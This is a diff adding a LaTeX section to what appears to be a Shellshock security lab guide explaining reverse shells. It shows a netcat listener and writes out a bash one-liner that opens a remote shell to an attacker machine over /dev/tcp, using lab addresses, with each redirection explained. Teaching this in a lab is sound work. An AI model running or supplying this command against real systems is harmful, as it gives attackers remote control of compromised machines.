@@ -1,0 +1,77 @@
+
+%\section{Guidelines: Creating Reverse Shell}
+%\label{shellshock:sec:reverseshell}
+
+
+The key idea of reverse shell is to redirect its standard input, output, and error devices to a
+network connection, so the shell gets its input from the connection, and prints out its output
+also to the connection. At the other end of the connection is a program run by the
+attacker; the program simply displays whatever comes from the shell at the other end,
+and sends whatever is typed by the attacker to the shell, over the network connection.
+
+A commonly used program by attackers is
+\texttt{netcat}, which, if running
+with the \texttt{"-l"} option, becomes a TCP server that listens for a connection on the
+specified port. This server program basically prints out whatever is sent by the client, and
+sends to the client whatever is typed by the user running the server.
+In the following experiment, \texttt{netcat} (\texttt{nc} for short) is used
+to listen for a connection on port \texttt{9090}~(let us focus only on the first line).
+
+
+\begin{lstlisting}
+Attacker(10.0.2.6):$ nc -nv -l 9090  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
+Listening on 0.0.0.0 9090
+Connection received on 10.0.2.5 39452
+Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
+Server(10.0.2.5):$ ifconfig
+ifconfig
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet (*@\textbf{10.0.2.5}@*)  netmask 255.255.255.0  broadcast 10.0.2.255
+        ...
+\end{lstlisting}
+
+
+The above \texttt{nc} command will block, waiting for a connection.
+We now directly run the following bash program on the Server machine~(\texttt{10.0.2.5}) to emulate
+what attackers would run after compromising the server via the Shellshock attack.
+This bash command will trigger a
+TCP connection to the attacker machine's port 9090, and a reverse shell will be created. We can
+see the shell prompt from the above result, indicating that the shell is running on the Server
+machine; we can type the \texttt{ifconfig} command to verify that the IP address is indeed
+\texttt{10.0.2.5}, the one belonging to the Server machine.  Here is the bash command:
+
+\begin{lstlisting}
+Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
+\end{lstlisting}
+
+The above command represents the one that would normally be executed on a compromised server.
+It is quite complicated, and we give a detailed explanation in the following:
+
+
+\begin{itemize}
+\item \texttt{"/bin/bash -i"}: The option \texttt{i} stands for interactive, meaning that the shell must be
+  interactive (must provide a shell prompt).
+
+\item \texttt{"> /dev/tcp/10.0.2.6/9090"}: This causes the output device~(\texttt{stdout}) of the shell
+  to be redirected to the TCP connection to \texttt{10.0.2.6}'s port \texttt{9090}.
+  In \unix systems, \texttt{stdout}'s file descriptor is \texttt{1}.
+
+\item \texttt{"0<\&1"}: File descriptor \texttt{0} represents the standard input device~(\texttt{stdin}).
+  This option tells the system to use the standard output device as the stardard input device.
+  Since \texttt{stdout} is already redirected to the TCP connection, this option basically
+  indicates that the shell program will get its input from the same TCP connection.
+
+\item \texttt{"2>\&1"}: File descriptor \texttt{2} represents the standard error \texttt{stderr}. This
+  causes the error output to be redirected to \texttt{stdout}, which is the TCP connection.
+\end{itemize}
+
+In summary, the command \texttt{"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<\&1 2>\&1"} starts a
+\texttt{bash} shell on the server machine, with its input coming from a TCP connection,
+and output going to the same TCP connection.
+In our experiment, when the \texttt{bash}
+shell command is executed on \texttt{10.0.2.5}, it connects back to the \texttt{netcat} process
+started on \texttt{10.0.2.6}. This is confirmed via the \texttt{"Connection from 10.0.2.5 ..."}
+message displayed by \texttt{netcat}.
+
+
+
